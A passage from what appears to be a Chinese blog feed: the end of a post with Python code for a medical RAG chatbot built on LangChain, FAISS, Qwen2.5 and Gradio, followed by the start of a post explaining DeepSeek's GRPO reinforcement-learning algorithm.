keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"数据库不存在，正在加载数据集..."</span><span class="token punctuation">)</span>    <span class="token keyword">from</span> datasets <span class="token keyword">import</span> load_dataset    <span class="token keyword">from</span> langchain<span class="token punctuation">.</span>docstore<span class="token punctuation">.</span>document <span class="token keyword">import</span> Document    data <span class="token operator">=</span> load_dataset<span class="token punctuation">(</span><span class="token string">"FreedomIntelligence/huatuo_encyclopedia_qa"</span><span class="token punctuation">,</span> split<span class="token operator">=</span><span class="token string">'train'</span><span class="token punctuation">)</span>    docs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> row <span class="token keyword">in</span> data<span class="token punctuation">:</span>        content <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>row<span class="token punctuation">,</span> ensure_ascii<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        docs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>Document<span class="token punctuation">(</span>page_content<span class="token operator">=</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span>    db <span class="token operator">=</span> <span class="token boolean">None</span>    batchsize <span class="token operator">=</span> <span class="token number">512</span>    index <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">with</span> tqdm<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>docs<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> bar<span class="token punctuation">:</span>        <span class="token keyword">while</span> index <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>docs<span class="token punctuation">)</span><span class="token punctuation">:</span>            batch <span class="token operator">=</span> docs<span class="token punctuation">[</span>index<span class="token punctuation">:</span> index <span class="token operator">+</span> batchsize<span class="token punctuation">]</span>            index <span class="token operator">+=</span> batchsize            <span class="token keyword">if</span> db <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                db <span class="token operator">=</span> FAISS<span class="token punctuation">.</span>from_documents<span class="token punctuation">(</span>batch<span class="token punctuation">,</span> embeddings<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                db<span class="token punctuation">.</span>add_documents<span class="token punctuation">(</span>batch<span class="token punctuation">)</span>            bar<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>batch<span class="token punctuation">)</span><span class="token punctuation">)</span>    db<span class="token punctuation">.</span>save_local<span class="token punctuation">(</span>db_path<span class="token punctuation">)</span>        system_prompt <span class="token operator">=</span> <span class="token triple-quoted-string string">"""你是一位医学专家。你擅长根据文档回答用户的提问。要求：1. 只使用提供的文档内容来回答问题。2. 不要添加任何额外的内容，如果文档中没有相关信息，请直接回答"无法回答"。3. 如果没有搜到相关文档，请回答"未查询到相关文档"。"""</span>        prompt_template <span class="token operator">=</span> PromptTemplate<span class="token punctuation">.</span>from_template<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""文档: &#123;context&#125;问题: &#123;question&#125;"""</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">retrieve</span><span class="token punctuation">(</span>question<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    docs <span class="token operator">=</span> db<span class="token punctuation">.</span>similarity_search_with_score<span class="token punctuation">(</span>question<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>    docs <span class="token operator">=</span> <span class="token punctuation">[</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>doc<span class="token punctuation">.</span>page_content<span class="token punctuation">)</span> <span class="token keyword">for</span> doc<span class="token punctuation">,</span> score <span class="token keyword">in</span> docs <span class="token keyword">if</span> score<span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0.9</span><span class="token punctuation">]</span>    docs <span class="token operator">=</span> <span class="token punctuation">[</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token string">"question"</span><span class="token punctuation">:</span> doc<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"questions"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">"answer"</span><span class="token punctuation">:</span> doc<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"answers"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> ensure_ascii<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span> <span class="token keyword">for</span> doc <span class="token keyword">in</span> docs<span class="token punctuation">]</span>    <span class="token keyword">return</span> docs<span class="token keyword">def</span> <span class="token function">format_references</span><span class="token punctuation">(</span>docs<span class="token punctuation">,</span> title<span class="token operator">=</span><span class="token string">"参考内容"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""将 Document 列表格式化为折叠式 Q-A Markdown 文本"""</span>    qa_blocks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i<span class="token punctuation">,</span> doc <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>docs<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        content <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>doc<span class="token punctuation">)</span>        question <span class="token operator">=</span> content<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"question"</span><span class="token punctuation">)</span>        answer <span class="token operator">=</span> content<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"answer"</span><span class="token punctuation">)</span>        qa_blocks<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Q</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>question<span class="token punctuation">&#125;</span></span><span class="token string">\n\n&lt;details>&lt;summary>A</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">:&lt;/summary>\n\n</span><span class="token interpolation"><span class="token punctuation">&#123;</span>answer<span class="token punctuation">&#125;</span></span><span class="token string">\n\n&lt;/details>"</span></span><span class="token punctuation">)</span>        body <span class="token operator">=</span> <span class="token string">"\n\n---\n\n"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>qa_blocks<span class="token punctuation">)</span>    markdown <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"&lt;details>&lt;summary></span><span class="token interpolation"><span class="token punctuation">&#123;</span>title<span class="token punctuation">&#125;</span></span><span class="token string">&lt;/summary>\n\n</span><span class="token interpolation"><span class="token punctuation">&#123;</span>body<span class="token punctuation">&#125;</span></span><span class="token string">\n\n&lt;/details>"</span></span>    <span class="token keyword">return</span> markdownTITLE <span class="token operator">=</span> <span class="token string">'医学RAG问答系统'</span>DESCRIPTION <span class="token operator">=</span> <span class="token string">'输入医学问题，我会基于专业内容为你解答。'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>main.py</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gradio <span class="token keyword">as</span> gr<span class="token keyword">from</span> langchain_core<span class="token punctuation">.</span>runnables <span class="token keyword">import</span> RunnableMap<span class="token punctuation">,</span> RunnableLambda<span class="token keyword">from</span> openai <span class="token keyword">import</span> OpenAI<span class="token keyword">from</span> RAG<span class="token punctuation">.</span>medical <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> warningswarnings<span class="token punctuation">.</span>filterwarnings<span class="token punctuation">(</span><span class="token string">"ignore"</span><span class="token punctuation">,</span> category<span class="token operator">=</span>FutureWarning<span class="token punctuation">)</span>client <span class="token operator">=</span> OpenAI<span class="token punctuation">(</span>    base_url<span class="token operator">=</span><span class="token string">"http://localhost:8000/v1"</span><span class="token punctuation">,</span>    api_key<span class="token operator">=</span><span class="token string">"n"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">stream</span><span class="token punctuation">(</span>prompt<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> history<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    messages <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        messages<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"role"</span><span class="token punctuation">:</span> <span class="token string">"system"</span><span class="token punctuation">,</span> <span class="token string">"content"</span><span class="token punctuation">:</span> system_prompt<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    messages<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"role"</span><span class="token punctuation">:</span> <span class="token string">"user"</span><span class="token punctuation">,</span> <span class="token string">"content"</span><span class="token punctuation">:</span> prompt<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        response <span class="token operator">=</span> client<span class="token punctuation">.</span>chat<span class="token punctuation">.</span>completions<span class="token punctuation">.</span>create<span class="token punctuation">(</span>        model<span class="token operator">=</span><span class="token string">"./model/Qwen2.5-7B-Instruct"</span><span class="token punctuation">,</span>        messages<span class="token operator">=</span>messages<span class="token punctuation">,</span>        stream<span class="token operator">=</span><span class="token boolean">True</span>    <span class="token punctuation">)</span>    <span class="token keyword">for</span> chunk <span class="token keyword">in</span> response<span class="token punctuation">:</span>        <span class="token keyword">if</span> chunk<span class="token punctuation">.</span>choices<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>delta<span class="token punctuation">.</span>content<span class="token punctuation">:</span>            <span class="token keyword">yield</span> chunk<span class="token punctuation">.</span>choices<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>delta<span class="token punctuation">.</span>content        <span class="token keyword">def</span> <span class="token function">summarize_context_query</span><span class="token punctuation">(</span>question<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> history<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""使用大模型总结历史提问，生成更准确的检索查询"""</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> history<span class="token punctuation">:</span>        <span class="token keyword">return</span> question        <span class="token comment"># 构建历史对话列表</span>    history <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f'Q: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_msg<span class="token punctuation">&#125;</span></span><span class="token string">\nA: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>response<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span> <span class="token keyword">for</span> user_msg<span class="token punctuation">,</span> response <span class="token keyword">in</span> history<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token comment"># 最近3轮</span>    system_prompt <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""你是一个重写助手，任务是将用户当前的问题结合历史对话重写为一个**自包含、清晰明确的问题句子**，以便发送给问答系统。请遵循以下规则：1. 仅重写问题，**不回答**；2. 替换句中的所有代词（如“它”、“这”、“那”等）为具体的名词或短语，当可能存在多个指代对象时，使用最新的历史对话中的信息；3. 推理指代、补全省略，使问题独立完整；4. 不引入历史中未提及的信息； 5. 只输出**重写后的问题句子**，不添加任何解释或注释。"""</span></span>        summary_prompt <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""历史对话：</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">&#125;</span></span><span class="token string">. </span><span class="token interpolation"><span class="token punctuation">&#123;</span>q<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span> <span class="token keyword">for</span> i<span class="token punctuation">,</span> q <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>history<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">当前问题：</span><span class="token interpolation"><span class="token punctuation">&#123;</span>question<span class="token punctuation">&#125;</span></span><span class="token string">你重写的问题："""</span></span>        <span class="token keyword">try</span><span class="token punctuation">:</span>        messages <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string">"role"</span><span class="token punctuation">:</span> <span class="token string">"system"</span><span class="token punctuation">,</span> <span class="token string">"content"</span><span class="token punctuation">:</span> system_prompt<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                    <span class="token punctuation">&#123;</span><span class="token string">"role"</span><span class="token punctuation">:</span> <span class="token string">"user"</span><span class="token punctuation">,</span> <span class="token string">"content"</span><span class="token punctuation">:</span> summary_prompt<span class="token punctuation">&#125;</span><span class="token punctuation">]</span>        response <span class="token operator">=</span> client<span class="token punctuation">.</span>chat<span class="token punctuation">.</span>completions<span class="token punctuation">.</span>create<span class="token punctuation">(</span>            model<span class="token operator">=</span><span class="token string">"./model/Qwen2.5-7B-Instruct"</span><span class="token punctuation">,</span>            messages<span class="token operator">=</span>messages<span class="token punctuation">,</span>            stream<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>            max_tokens<span class="token operator">=</span><span class="token number">50</span>        <span class="token punctuation">)</span>                summarized_query <span class="token operator">=</span> response<span class="token punctuation">.</span>choices<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>message<span class="token punctuation">.</span>content<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"原始问题: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>question<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"重写问题: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>summarized_query<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> summarized_query            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> question<span class="token keyword">def</span> <span class="token function">build_context_query</span><span class="token punctuation">(</span>question<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> history<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""构建包含历史上下文的查询"""</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> history<span class="token punctuation">:</span>        <span class="token keyword">return</span> question        <span class="token keyword">return</span> summarize_context_query<span class="token punctuation">(</span>question<span class="token punctuation">,</span> history<span class="token punctuation">)</span>rag_chain <span class="token operator">=</span> <span class="token punctuation">(</span>    RunnableMap<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token string">"history"</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token string">"history"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">"question"</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> build_context_query<span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token string">"question"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token string">"history"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token operator">|</span> RunnableLambda<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>        <span class="token string">"question"</span><span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token string">"question"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">"history"</span><span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token string">"history"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">"context"</span><span class="token punctuation">:</span> retrieve<span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token string">"question"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token operator">|</span> RunnableLambda<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>        <span class="token string">"question"</span><span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token string">"question"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">"history"</span><span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token string">"history"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">"context"</span><span class="token punctuation">:</span> <span class="token string">"\n"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token string">'context'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">"references"</span><span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token string">'context'</span><span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token operator">|</span> RunnableLambda<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>        <span class="token string">"prompt"</span><span class="token punctuation">:</span> prompt_template<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>question<span class="token operator">=</span>x<span class="token punctuation">[</span><span class="token string">"question"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> context<span class="token operator">=</span>x<span class="token punctuation">[</span><span class="token string">"context"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">"history"</span><span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token string">"history"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">"references"</span><span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token string">"references"</span><span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token operator">|</span> RunnableLambda<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>        <span class="token string">"response"</span><span class="token punctuation">:</span> stream<span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token string">"prompt"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token string">"history"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">"references"</span><span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token string">"references"</span><span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">qa_interface</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span> history<span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> rag_chain<span class="token punctuation">.</span>invoke<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"question"</span><span class="token punctuation">:</span> message<span class="token punctuation">,</span> <span class="token string">"history"</span><span class="token punctuation">:</span> history<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    generator <span class="token operator">=</span> result<span class="token punctuation">[</span><span class="token string">"response"</span><span class="token punctuation">]</span>    references <span class="token operator">=</span> result<span class="token punctuation">[</span><span class="token string">"references"</span><span class="token punctuation">]</span>    response <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> token <span class="token keyword">in</span> generator<span class="token punctuation">:</span>        response <span class="token operator">+=</span> token        <span class="token keyword">yield</span> response    references_text <span class="token operator">=</span> format_references<span class="token punctuation">(</span>references<span class="token punctuation">)</span>            response <span class="token operator">+=</span> <span class="token string">"\n\n"</span> <span class="token operator">+</span> references_text    <span class="token keyword">yield</span> responsechat <span class="token operator">=</span> gr<span class="token punctuation">.</span>ChatInterface<span class="token punctuation">(</span>    fn<span class="token operator">=</span>qa_interface<span class="token punctuation">,</span>    title<span class="token operator">=</span>TITLE<span class="token punctuation">,</span>    description<span class="token operator">=</span>DESCRIPTION<span class="token punctuation">)</span>chat<span class="token punctuation">.</span>launch<span class="token punctuation">(</span>server_name<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用体验如下：</p><p><img src="https://blogfiles.oss.fyz666.xyz/gif/182a26c7-8298-453c-a6d5-81ca4aa6a4d6.gif" alt=""></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;前情提要-amp-动机&quot;&gt;&lt;a href=&quot;#前情提要-amp-动机&quot; class=&quot;headerlink&quot; title=&quot;前情提要 &amp;amp; 动机&quot;&gt;&lt;/a&gt;前情提要 &amp;amp; 动机&lt;/h2&gt;&lt;p&gt;前段时间忙里偷闲和女朋友一起去了趟云南（你可以查看&lt;a</summary>
        
      
    
    
    
    <category term="学习笔记" scheme="https://blog.fyz666.xyz/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="大语言模型训练" scheme="https://blog.fyz666.xyz/categories/%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B%E8%AE%AD%E7%BB%83/"/>
    
    
    <category term="LLM" scheme="https://blog.fyz666.xyz/tags/llm/"/>
    
    <category term="RAG" scheme="https://blog.fyz666.xyz/tags/rag/"/>
    
  </entry>
  
  <entry>
    <title>大语言模型训练原理与实践（七）：GRPO算法</title>
    <link href="https://blog.fyz666.xyz/blog/12877/"/>
    <id>https://blog.fyz666.xyz/blog/12877/</id>
    <published>2025-07-10T10:07:45.000Z</published>
    <updated>2025-08-14T08:53:41.568Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><div class="note primary simple"><p>2025年1月27日，因中国 AI 初创企业 DeepSeek 发布低成本高性能模型，英伟达市值单日缩水约6000亿美元，股价暴跌约17%。</p></div><p><img src="https://blogfiles.oss.fyz666.xyz/jpg/f212030c-dc0d-4926-b6e5-2f9579bdbf27.jpg" alt="NVDA stock price 1-week chart. Source: Finbold" style="zoom:50%;" /></p><p>这事在圈内激起了不小的波澜，众所周知，大模型的训练过程十分消耗算力，尤其是常规的RLHF阶段使用的PPO算法，流程复杂又烧钱。比如OpenAI在训练ChatGPT时，动辄上万张A100、H100堆起来跑，而Nvidia几乎是算力的唯一供应商。</p><p>而DeepSeek团队推翻了这一现状：训练一个性能能够对标主流水平的大模型，并不需要那么多的卡（仅使用约2k张H800）。他们通过一套更高效、轻量的流程大幅简化了训练的成本与复杂度，其中最核心的改进便是引入了<strong>Group Relative Policy Optimization（GRPO）算法</strong>。那么，这个算法究竟是何方神圣？感兴趣的朋友可以直接阅读下面的原论文：</p><a class="tag-Link" target="_blank" href="https://arxiv.org/abs/2501.12948">    <div class="tag-link-tips">引用站外地址，不保证站点的可用性和安全性</div>    <div class="tag-link-bottom">        <div class="tag-link-left">            <img src="https://logo.clearbit.com/arxiv.org?size=256" onerror="this.onerror=null;this.src='/images/default-link.png';" />        </div>        <div class="tag-link-right">            <div class="tag-link-title">DeepSeek-R1</div>            <div class="tag-link-sitename"> $\text{ar}\chi\text{iv}$​</div>        </div>        <i class="fa-solid fa-angle-right"></i>    </div>    </a><hr><p>插句题外话，博主在当时几乎第一时间就把论文下载了下来：</p><p><img src="https://blogfiles.oss.fyz666.xyz/png/c8d7236b-43e2-4e18-8a5a-c9b825200b3f.png" alt=""></p><p>然而由于<del>实验室搬砖</del>科研等各种事，一直拖着没认真读（唉，读了又怎么样呢？当时的显存连个7b的模型都放不下）。时隔多月，终于显存和心理都空出一点空间，总算能静下心来，把这个 GRPO算法好好研究、复现了一遍。</p><p>DeepSeek-R1的论文其实对整体的训练流程也做了不少改进，但核心贡献还是在于其在强化学习阶段引入的GRPO算法，因此我主要研究了这个强化学习算法的细节。</p><p>博主写这篇文章的目的，就是记录一下自己对 GRPO 算法的理解，以及在复现过程中整理的一些关键细节和实践心得。</p><h2 id="GRPO算法的思想"><a href="#GRPO算法的思想" class="headerlink" title="GRPO算法的思想"></a>GRPO算法的思想</h2><p>GRPO算法，即组相对策略优化（Group Relative Policy Optimization），其核心思想是：不再单独对一个token序列打分，而是在同一个prompt下采样多条输出，形成一个分组，然后在分组中计算输出间的相对优劣，得到每条输出的组内相对得分，以此指导模型更新。</p><p>除此以外，GRPO算法和先前的PPO算法还有一些区别：</p><ol><li>GRPO算法省去了Reward Model与Critic Model。</li><li>论文针对任务数据集特点设计了一些基于规则的Reward Function，来对输出进行打分。</li><li>与PPO算法中token-level的优势函数不同，GRPO算法中的优势函数是sample-level的，即一个输出的所有token共享同一个组内优势值。</li><li>GRPO算法将PPO算法的Reward中添加的KL正则项移到了损失函数中。</li><li>GRPO算法使用了另一种不同的KL散度估计方法。</li></ol><p>我们来逐点分析。首先看第二点，论文中提到：</p><blockquote><p>We do not apply the outcome or process neural reward model in developing DeepSeek-R1-Zero, because we find that <strong>the neural reward model may suffer from reward hacking</strong> in the large-scale reinforcement learning process, and retraining the reward model needs additional training resources and it complicates the whole training pipeline.</p></blockquote><p>我在微调RLHF的时候确实也遇到过这种情况。常规PPO算法非常依赖于Reward Model的质量，但基于神经网络的Reward Model在用于强化学习时经常会遇到<strong>Reward Hacking</strong>，即模型在训练时学会了钻Reward Model的漏子，用一些不好的输出获取非常高的得分，即模型学会了“讨好”奖励模型，而不去努力产生高质量的输出（<del>不好，这怎么像极了我做科研时的样子</del>）。</p><p><img src="https://blogfiles.oss.fyz666.xyz/jpeg/3b2da4ed-939f-4e34-aeb9-95fdc4821e8d.jpeg" alt=""></p><p>而对神经网络攻击稍有了解的朋友就会知道，神经网络模型作为一个高度不可解释的黑盒系统，很容易被“投其所好”地构造出满足特定输出的输入 —— 即使这些输入在人类看来是无意义甚至错误的。</p><p>正是由于这种脆弱性，我们训练的语言模型只需要偶然间发现一条让奖励模型输出高分的捷径，它就可能在这条离谱的道路上越走越远，或产生模式崩坏、或输出质量奇差的内容。</p><p>不好，跑题了。。。</p><hr><p>那么论文提到的基于规则的Reward函数主要有两种：</p><ol><li>基于正确性的奖励（Accuracy rewards）：对于一些有“标准答案”的任务，例如具有准确答案的数学问题、代码生成任务等，可以根据模型答题是否准确来给一定的奖励。</li><li>基于格式的奖励（Format rewards）：根据模型的输出结果是否满足一定的格式要求来进行给分。如论文提到<strong>将模型的思维过程置于<code>&lt;think&gt;</code>和<code>&lt;/think&gt;</code>标签之间</strong>，如模型输出的内容满足此条件则给奖励。</li></ol><p>不过，对于通用型任务而言，Accuracy 